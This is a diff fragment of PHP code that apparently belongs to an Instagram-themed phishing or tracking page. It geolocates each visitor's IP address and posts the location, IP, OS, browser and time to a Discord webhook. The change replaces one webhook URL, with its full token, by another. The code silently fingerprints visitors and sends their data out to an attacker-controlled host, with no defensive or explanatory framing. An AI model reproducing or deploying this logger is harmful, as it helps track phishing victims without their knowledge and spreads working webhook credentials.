@@ -88,7 +88,7 @@ $ipdat = @json_decode(file_get_contents(
     "http://www.geoplugin.net/json.gp?ip=" . $ip)); 
 $time = date('Y-m-d H:i:s');
 $make_json = json_encode(array('content'=>"Instagram bich  | $ipdat->geoplugin_countryName | $ipdat->geoplugin_continentName | $ipdat->geoplugin_currencyCode | $ipdat->geoplugin_timezone | $ip | $user_os | $user_browser | $time \n", "username" => "$ip"));
-$exec = curl_init("https://discordapp.com/api/webhooks/783278384377102388/eRFWws-eeOKdRft9rz54bbX5_uoYa84-ViqU23zWB1QWtZvQcwNJayOnPPkDmFTL4WCY");
+$exec = curl_init("https://discord.com/api/webhooks/931116462721089547/qTSiyYZVD4dtshmO69lYyU761293JsyS9QbcpaTBzH6VQQbP1cQ-qS-oe1OvxY-qvQM0");
 curl_setopt( $exec, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
 curl_setopt( $exec, CURLOPT_POST, 1);
 curl_setopt( $exec, CURLOPT_POSTFIELDS, $make_json);
